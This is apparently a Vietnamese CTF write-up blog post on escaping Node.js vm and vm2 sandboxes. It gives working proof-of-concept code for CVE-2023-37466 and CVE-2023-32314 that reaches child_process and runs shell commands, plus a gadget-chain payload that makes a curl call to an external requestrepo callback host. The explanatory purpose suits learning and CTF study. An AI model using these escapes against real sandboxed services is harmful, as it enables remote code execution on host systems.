---
title: "NodeJS escape VM and some gadgets chaining in NodeJS"
date: 2024-08-12 00:00:00 +0800
categories: [CTF Writeup]
tags: [NodeJS, Esacpe VM]
---

## NodeJS escape VM and some gadgets chaining in NodeJS


### Sandbox là gì?

Khi chúng ta chạy một số chương trình có thể gây nguy hiểm cho hệ thống thì chúng ta cần một cách để chạy chúng mà không ảnh hưởng đến hệ thống. Đó chính là lý do mà sandbox ra đời. Sandbox là một môi trường ảo được tạo ra hoàn toàn cô lập với máy chính (nhưng vẫn sử dụng tài nguyên của máy chính) để chạy các chương trình mà không ảnh hưởng đến hệ thống. Do đó, bất kỳ ảnh hướng gây hại nào từ code độc hại sẽ chỉ ảnh hưởng lên sandbox không ảnh hướng đến máy chính.

### Escape VM

VM escape xảy ra khi attacker có thể thoát ra ngoài môi trường độc lập kia và thực hiện các lệnh độc hại lên máy chính. Đây là một lỗi rất nguy hiểm vì nó có thể để attacker có khả năng xâm nhập vào máy chính

### Module VM

Sử dụng module `node:vm` (ngoài ra còn có `vm2` ) cho phép lập trình viên biên dịch và chạy code động bên trong ngữ cảnh V8 Vitural Machine, có thể hiểu đơn giản là code được thực thi có global object khác với code gọi nó. Ví dụ

```js
const vm = require('node:vm');

const x = 1;

const context = { x: 2 };
vm.createContext(context); // tạo ngữ cảnh

const code = 'x += 40; var y = 17;';
// `x` and `y` are global variables in the context.
// Initially, x has the value 2 because that is the value of context.x.
vm.runInContext(code, context);

console.log(context.x); // 42
console.log(context.y); // 17

console.log(x);
console.log(y); 
// 1; y is not defined. 
```

Có nghĩa là code chạy trong `context` sẽ không ảnh hưởng đến biến ngoài `context` và ngược lại


### An insecure JavaScript sandbox

- `vm.runInThisContext(code)`:
Tạo một sandbox trong phạm vi global hiện tại và thực thi mã truyền vào như là tham số. Sandbox này truy cập được vào các thuộc tính của global nhưng không thể truy cập vào các thuộc tính của các module khác

![alt text](assets/escapevm/image.png)

```js
const vm = require('vm');
let globalobject = process;
const vmResult = vm.runInThisContext('process');;
if (globalobject === vmResult) {
    console.log('VM is running in the global context');
}
///VM is running in the global context

```

```js
const vm = require('vm');
let localVar = 'di';
const vmResult = vm.runInThisContext('localVar = "box";');
console.log('vmResult:', vmResult);
console.log('localVar:', localVar);
// vmResult: 'box', localVar: 'di'

```

- `vm.createContext([sandbox])`: Trước khi sử dụng, cần tạo một đối tượng sandbox, sau đó chuyển đối tượng sandbox này làm tham số cho phương thức (nếu không có, một đối tượng sandbox rỗng sẽ được tạo tự động). V8 (JavaScript Engine) tạo ra một phạm vi mới bên ngoài global hiện tại cho đối tượng sandbox. Lúc này, đối tượng sandbox trở thành đối tượng toàn cục của phạm vi mới được tạo, và bên trong sandbox, không thể truy cập các thuộc tính trong global


```js
const vm = require('vm');
global.test = 9;

const sandbox = { test : 9};
vm.createContext(sandbox);
vm.runInContext('test = test + 3', sandbox);
console.log(global.test); // 9
console.log(sandbox); // { test: 12 }
```

`Hàm vm.runInNewContext(code[, sandbox][, options])` là sự kết hợp của createContext và runInContext. Nó nhận vào mã cần thực thi (code), một đối tượng sandbox và tùy chọn (options). Nói đơn giản là gộp 2 function làm một


`vm.Script` là một lớp trong Node.js cho phép bạn biên dịch và chạy đoạn mã JavaScript trong một ngữ cảnh cụ thể. Các đối tượng của lớp vm.Script chứa các đoạn mã đã được biên dịch trước và có thể được thực thi nhiều lần trong một hoặc nhiều sandbox.

`script` có thể được chạy thông qua `runInNewContext`

Khi thực hiện thoát khỏi sandbox, mục tiêu thường là thực hiện RCE (Remote Code Execution). Trong Node.js, để thực hiện RCE, chúng ta cần truy cập vào đối tượng `process`. Một khi đã có được đối tượng `process`, chúng ta có thể sử dụng `require` để nhập `child_process` và sau đó dùng `child_process` để thực thi các lệnh hệ thống. Mặc dù đối tượng `process` được gắn vào `global`, khi tạo một ngữ cảnh mới (sử dụng `createContext`), đối tượng `global` không còn có thể truy cập được. Vì vậy, mục tiêu cuối cùng là tìm cách đưa đối tượng `process` từ `global` vào môi trường sandbox.

```js
const vm = require("vm");
const test = vm.runInNewContext(`this.constructor.constructor('return process.env')()`);
console.log(test);
```

hoặc

```js
const vm = require('vm');
const sandbox = { test : 1337};
vm.createContext(sandbox);
vm.runInContext(`test = this.constructor.constructor('return process.env')()`, sandbox);
console.log(sandbox)
```

![alt text](assets/escapevm/2.png)

Vậy vì sao chúng ta có thể thoát khỏi sandbox và access được global? Lý do là vì trong đoạn code trên `this` trỏ đến `runInContext` ( hoặc `runInNewContext`), nó không thuộc về sandbox, chúng ta có thể dựa vào cái này để lấy constructor của nó sau đó tiếp tục lấy constructor của nó ta sẽ lấy được `Function` (cái này là của bên ngoài sandbox). Cuối cùng dựa vào `Function` mà ta vừa lấy được ta có thể lấy được `process`

Nói một cách đơn giản, quá trình này ta chain các `gadget` để truy cập đến constructor của Function, sau đó tạo hàm và lấy process. Đây chính là cách đơn giản nhất để thoát khỏi sandbox

Sau khi có process thì RCE là chuyện đơn giản

Một số trường hợp khác

```js
const vm = require('vm');

const script = `(() => {
  const a = {};
  a.toString = function () {
    const cc = arguments.callee.caller;
    const p = (cc.constructor.constructor('return process'))();
    return p.mainModule.require('child_process').execSync('whoami').toString();
  };
  return a;
})()`;

const sandbox = Object.create(null);
const context = new vm.createContext(sandbox);
const res = vm.runInContext(script, context);
console.log('Hello ' + res);

```


Khi this đang là null và không có đối tượng nào khác để tham chiếu, chúng ta có thể tận dụng thuộc tính nội tại của đối tượng hàm, cụ thể là `arguments.callee.caller`. Thuộc tính này cho phép chúng ta xác định hàm nào đã gọi hàm hiện tại.

Trong tình huống này, việc thoát khỏi sandbox (sandbox escape) thực chất là tìm một đối tượng bên ngoài môi trường sandbox và gọi một trong các phương thức của nó. Cách thực hiện là định nghĩa một hàm trong sandbox, sau đó gọi hàm đó từ bên ngoài sandbox. Khi hàm trong sandbox được gọi, thuộc tính `arguments.callee.caller` sẽ trả về đối tượng hàm từ bên ngoài sandbox. Từ đó, chúng ta có thể khai thác để thực hiện việc thoát khỏi môi trường sandbox.


Giải thích đơn giản

Tóm lại, muốn escape sandbox thì chúng ta cần access được bất kỳ thứ gì không thuộc sandbox, như 2 ví dụ trên là `Function` và `arguments.callee.caller` và từ đó ta có thể làm bất cứ điều gì.

- Ngoài `vm` ra thì còn một module khác là `vm2` được coi là "bản nâng cấp" của `vm`. `vm2` là một sandbox hổ trợ chạy các unstrusted code với các built-in module của Nodejs. `vm2` dùng Proxy để ngăn chặn thoát khỏi sandbox. Tuy nhiên tương tự như `vm` thì `vm2` cũng có thể bị thoát khỏi sandbox nhưng cách thức thoát khỏi nó phức tạp hơn nên ta sẽ đi vào phân tích các CVE gần đây

### CVE-2023-37466

In vm2 for versions up to 3.9.19, Promise handler sanitization can be bypassed with @@species accessor property allowing attackers to escape the sandbox and run arbitrary code.

POC
```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch pwned'); }
            )
        }
    }
};
p.then();
`;

console.log(vm.run(code));
```

**Phân tích**

Một trạng thái bất thường của máy chính trong ngữ cảnh bất đồng bộ (Promise) sẽ có thể leak object của máy chính ra ngoài, như ở trên ta có thể dựa vào đây để thoát khỏi sandbox và RCE

Ban đầu khi mới vào thì `Promise.prototype.then` đã bị viết đè bằng cách dùng Proxy để khử các tham số mà người dùng cung cấp cho function `onRejected`

![alt text](assets/escapevm/4.png)

Đọc document của ES2022 của `Promise.prototype.then` có chỉ một đoạn liên quan đến `@@species` ở đây [link](https://tc39.es/ecma262/2022/multipage/control-abstraction-objects.html#sec-promise.prototype.then)

```
When the then method is called with arguments onFulfilled and onRejected, the following steps are taken:

1. Let promise be the this value.
2. If IsPromise(promise) is false, throw a TypeError exception.
**3. Let C be ? SpeciesConstructor(promise, %Promise%).**
**4. Let resultCapability be ? NewPromiseCapability(C).**
**5. Return PerformPromiseThen(promise, onFulfilled, onRejected, resultCapability).**
```

Có 3 đoạn cần chú ý ở trên đó là `SpeciesConstructor`, `NewPromiseCapability` và `PerformPromiseThen`

```
1. Let C be ? Get(O, "constructor").
2. If C is undefined, return defaultConstructor.
3. If Type(C) is not Object, throw a TypeError exception.
4. Let S be ? Get(C, @@species).
5. If S is either undefined or null, return defaultConstructor.
6. If IsConstructor(S) is true, return S.
7. Throw a TypeError exception.
```

Đây là pesudo code của `SpeciesConstructor` cả đoạn trên tóm lại là nó sẽ return object `@@species`

và tiếp theo là  `NewPromiseCapability`

```
1. If IsConstructor(C) is false, throw a TypeError exception.
2. NOTE: C is assumed to be a constructor function that supports the parameter conventions of the Promise constructor (see 27.2.3.1).
3. Let promiseCapability be the PromiseCapability Record { [[Promise]]: undefined, [[Resolve]]: undefined, [[Reject]]: undefined }.
4. Let executorClosure be a new Abstract Closure with parameters (resolve, reject) that captures promiseCapability and performs the following steps when called:
a. If promiseCapability.[[Resolve]] is not undefined, throw a TypeError exception.
b. If promiseCapability.[[Reject]] is not undefined, throw a TypeError exception.
c. Set promiseCapability.[[Resolve]] to resolve.
d. Set promiseCapability.[[Reject]] to reject.
e. Return undefined.
5. Let executor be CreateBuiltinFunction(executorClosure, 2, "", « »).
6. Let promise be ? Construct(C, « executor »).
7. If IsCallable(promiseCapability.[[Resolve]]) is false, throw a TypeError exception.
8. If IsCallable(promiseCapability.[[Reject]]) is false, throw a TypeError exception.
9. Set promiseCapability.[[Promise]] to promise.
10. Return promiseCapability.
```

Cả đoạn trên ta có thể rút gọn bỏ đi các phần không liên quan đến CVE là như sau

+ NewPromiseCapability cho phép tạo một constructor và gán nó bằng giá trị của `@@sepcies`, sau đó sử dụng `executor` là một closure (đại loại là nó có thể access được các biến từ phạm vi bên ngoài nó) nhận 2 xử lý là `resolve` và `reject` và gán mỗi giá trị vào `resultCapability.[[Resolve]]` và `resultCapability.[[Reject]]`.

Tiếp tục ở đoạn `PerformPromiseThen`, nó có định nghĩa `promise.[[PromiseState]]` lúc bị `rejected`

```
8. Let rejectReaction be the PromiseReaction { [[Capability]]: resultCapability, [[Type]]: Reject, [[Handler]]: onRejectedJobCallback }.
9. If promise.[[PromiseState]] is pending, then ...
10. Else if promise.[[PromiseState]] is fulfilled, then ...
11. Else,
    a. Assert: The value of promise.[[PromiseState]] is rejected.
    b. Let reason be promise.[[PromiseResult]].
    c. If promise.[[PromiseIsHandled]] is false, perform HostPromiseRejectionTracker(promise, "handle").
    d. Let rejectJob be NewPromiseReactionJob(rejectReaction, reason).
    e. Perform HostEnqueuePromiseJob(rejectJob.[[Job]], rejectJob.[[Realm]]).
```
Trong này có 1 đoạn quan trọng là `rejectJob = NewPromiseReactionJob(rejectReaction, reason)` vì nó sẽ là điều kiện để chúng ta thực hiện RCE

Tiếp tục đọc mã giả của `NewPromiseReactionJob`

```
1. Let job be a new Job Abstract Closure with no parameters that captures reaction and argument and performs the following steps when called:
    a. Let promiseCapability be reaction.[[Capability]].
    b. Let type be reaction.[[Type]].
    c. Let handler be reaction.[[Handler]].
    d. **If handler is empty, then**
        i. If type is Fulfill, let handlerResult be NormalCompletion(argument).
        ii. Else,
            1. Assert: type is Reject.
            2. **Let handlerResult be ThrowCompletion(argument).**
    e. Else, let handlerResult be Completion(HostCallJobCallback(handler, undefined, « argument »)).
    f. If promiseCapability is undefined, then
        i. Assert: handlerResult is not an abrupt completion.
        ii. Return empty.
    g. Assert: promiseCapability is a PromiseCapability Record.
    h. **If handlerResult is an abrupt completion, then**
        i. **Return ? Call(promiseCapability.[[Reject]], undefined, « handlerResult.[[Value]] »).**
    i. Else,
        i. Return ? Call(promiseCapability.[[Resolve]], undefined, « handlerResult.[[Value]] »).
```

Ta sẽ chú ý đến các đoạn d.ii, h.i

Nếu `handler` không là rỗng và type là Reject (nghĩa là promise đang bị từ chối), thì handlerResult sẽ được gán là một hoàn thành kiểu ném lỗi của argument. Điều này thể hiện việc promise đã bị từ chối.

Sau đó là 

Nếu `handlerResult` là một hoàn thành đột ngột(abrupt completion), thì

Trả về ? Call(promiseCapability.[[Reject]], undefined, « handlerResult.[[Value]] »).

Nếu handlerResult là một hoàn thành đột ngột (nghĩa là xảy ra lỗi trong quá trình xử lý), thì cần phải gọi hàm Reject của promiseCapability với giá trị lỗi từ handlerResult.

Vậy từ tất cả thứ trên, tóm lại ta có thể escape sandbox như sau:

1. Gọi một function bất đồng bộ để nó throw ra trạng thái bất thường ở máy chính, trả về rejected Promise object
2. Ta sẽ ghi đè constructor của Promise object với thuộc tính của @@species (Symbol.species) với giá trị là executor thừa hưởng từ lớp cha và gọi với 2 hàm xử lý `resolve` và `reject`(ta bỏ payload vào đây)
3. Gọi `then` để trigger `Call(promiseCapability.[[Reject]], undefined, « handlerResult.[[Value]] »).` và ez RCE

### CVE-2023-32314
```
A sandbox escape vulnerability exists in vm2 for versions up to 3.9.17. It abuses an unexpected creation of a host object based on the specification of Proxy, and allows RCE via Function in the host context.
```

POC

```js
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("echo hacked").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code));
```

**Phân tích**

CVE này nhìn cũng khá giống CVE trên kia nhưng nó đơn giản hơn

Khi `err.name.toString` được gọi ở  `ErrorPrototypeToString` trong `prepareStackTrace` thì nó lại là trong ngữ cảnh của máy chính

+ `error` của  `prepareStackTrace` không được xử lý qua cơ chế proxy của `vm2` nên nó được gọi thẳng bởi V8

Và còn 1 điều nữa là ở Proxy khi được gọi đến nó có 1 đoạn mã giả như sau

```
7. Let argArray be CreateArrayFromList(argumentsList).
8. Return ? Call(trap, handler, « target, thisArgument, argArray »).
```

Khi `err.name.toString` được gọi thì `CreateArrayFromList()` sẽ tạo ra argArray ở ngữ cảnh của máy chính sau đó được truyền vào `apply(target, thiz, args)`. Vậy ta có thể tiếp cận được `Function` ở máy chính. Từ đó RCE

### Gadgets chaining

Gadgets chaining là một kỹ thuật sử dụng các gadgets (một chuỗi các lệnh nhỏ) để thực hiện kết nối chúng lại với nhau. Ví dụ như việc sử dụng các gadgets để thực hiện một hành động như RCE



Note: Cách này mình đã đọc được từ writeup của các giải amstrong2024 và TSG2023 và tham khảo của anh shin24 link mình sẽ đính kèm bên dưới

```js
toString.constructor.prototype.toString=toString.constructor.prototype.call;
var a=["process.mainModule.require('child_process').execSync('curl http://yh9wz5br.requestrepo.com')"];
a[1]="x";
b={};
b[Symbol.hasInstance]=a.sort;
b["__proto__"]=a;
toString.constructor instanceof b;
```

Giải thích sơ qua về payload này

- Đầu tiên chúng ta sẽ gọi đến function `toString` và gán giá trị của function `call` cho nó

- Tiếp theo ta tạo một mảng a với giá trị đầu tiên là payload mà ta muốn execute (payload này sẽ được thực thi trong anonymous function)

- Tiếp theo ta gán giá trị ``'x'`` cho `a[1]` (sẽ giải thích ở bên dưới vì sao có phần này)

- Sau đó tạo một object b với key là `Symbol.hasInstance` và value là `a.sort`

- Sau đó set `__proto__` của b là a

- Cuối cùng là kiểm tra xem toString.constructor có phải là instance của b (thật ra đoạn này không hẳn là kiểm tra mà là điều kiện để RCE)

Trước khi đi vào phần phân tích sâu hơn, mình sẽ giải thích về cách của instanceof hoạt động

Syntax

```js
object instanceof constructor
```

Toán tử `instanceof` là toán tử dùng để kiểm tra xem một đối tượng có thuộc lớp nào đó hay không

Ví dụ đơn giản như sau

```js
class BOX {}
let DI = new BOX();

console.log(DI instanceof BOX); //true
```

Ngoài ra nếu `constructor` (phần bên phải của `instanceof`) có phương thức `Symbol.hasInstance` thì nó sẽ được ưu tiên gọi, với `object` (phần bên trái của `instanceof`) là tham số truyền vào còn bên phải là `this` sau đó dùng kết quả để trả về kết quả của `instanceof`

Ví dụ 1:

```js
BOX = {[Symbol.hasInstance]: (dib) => {
    // console.log(dib)
    return dib === 'dib'
}};

DI = 'dib'

console.log(DI instanceof BOX); //true

```

Ví dụ 2:

```js
a = ['1','0']
a.__proto__['loG'] = function(a) {
    console.log("triggered")
}
BOX = {[Symbol.hasInstance]: a.loG};

DI = Function

console.log(DI instanceof BOX); // "triggered"
// console.log(a)
```

Đến phần chính, đi sâu vào giải thích vì sao nó hoạt động

```js
toString.constructor instanceof b;
```

Khi câu lệnh này được thực thi thì:

- Khi `instanceof` được sử dụng thì nó sẽ tìm kiếm xem b có thuộc tính `Symbol.hasInstance` không? Nếu có thì sẽ thực thi gọi tới `a.sort` là `this` và `toString.constructor` (AKA `Function`) là tham số truyền vào

- Khi `a.sort`(function sort) được gọi đến thì bình thường  thì nó sẽ cố gắng chuyển tất cả các phần tử trong mảng thành string bằng hàm `toString()` rồi so sánh bằng `function` truyền vào. Điều này vô tình trigger hàm `call()` chúng ta đã đổi ở lúc đầu và bây giờ cả `array` sẽ trở thành `parameter` của `new Function`

- Nói thêm ở phần này về lý do phải set `b[__proto__]=a` là vì `sort` là `function` của `array` nên chúng ta phải đổi `prototype` của nó thành `array` thì sort mới có thể được thực thi và hơn hết khi đó `sort` sẽ được thực thi trên `b`, `b` lúc này là một `object` nên `sort` sẽ cố gắng tìm kiếm `array` trong `object` này bằng cách tìm kiếm trong `prototype` của nó khi đó nó sẽ tìm được 1 `array` trong vì ta set `prototype` của `b` là `a`

- Giá trị return của `new Function` này sẽ là một anonymous với `a[0]` là function và `a[1]` là parameter

```js
(function anonymous(x
) {
process.mainModule.require('child_process').execSync('curl http://yh9wz5br.requestrepo.com')
})
```

- Để nói thêm một chút nữa thì flow của chương trình sẽ như sau trigger `sort` -> `sort` nhận `Function` làm tham số -> `Function` là hàm được sử dụng để 'so sánh' các phần tử bên trong mảng -> Mỗi phần từ được chuyển qua string(trigger `call` function) -> Trả về một anonymouse function -> Cuối cùng giá trị sau khi 'so sánh' sẽ được trả về dưới dạng string (trigger `call` function)

Đây là code mô phỏng lại quá trình sort

```js
toString.constructor.prototype.toString=Function.call;

Function(a[1].toString(),a[0].toString()).toString();
```



